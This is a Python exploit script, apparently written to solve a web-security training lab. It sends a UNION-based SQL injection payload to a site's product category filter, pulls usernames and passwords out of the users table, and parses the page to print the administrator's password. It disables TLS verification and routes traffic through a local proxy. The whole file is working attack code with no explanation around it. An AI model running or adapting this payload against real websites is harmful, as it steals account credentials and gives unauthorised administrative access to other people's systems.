import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Gifts'
    sql_payload = "' UNION SELECT username,password FROM users--"
    r=requests.get(url + path + sql_payload,verify=False,proxies=proxies)
    res =r.text
    if 'administrator' in res:
        print("[+] Found the admin password.")
        soup = BeautifulSoup(res,"html.parser")
        admin_pass = soup.body.find(string="administrator").parent.findNext('td').contents[0]
        print("[+] The admin password is '%s' " %admin_pass)
        return True
    return False
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an admininstrator password.")